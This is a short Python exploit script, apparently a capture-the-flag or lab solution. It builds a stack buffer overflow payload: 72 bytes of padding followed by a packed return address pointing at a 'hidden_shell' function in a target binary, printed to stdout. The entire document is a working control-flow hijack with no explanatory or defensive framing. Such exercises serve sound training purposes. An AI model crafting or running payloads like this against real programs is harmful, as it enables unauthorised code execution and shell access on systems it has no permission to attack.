#!/usr/bin/env python3
import sys
import struct

# Address from objdump: 0x401146
hidden_shell_addr = 0x401146

padding = 64 + 8  # 72 bytes total before RIP
payload = b"A" * padding
payload += struct.pack("<Q", hidden_shell_addr)

# Write the exact bytes to stdout, with no extra newline
sys.stdout.buffer.write(payload)
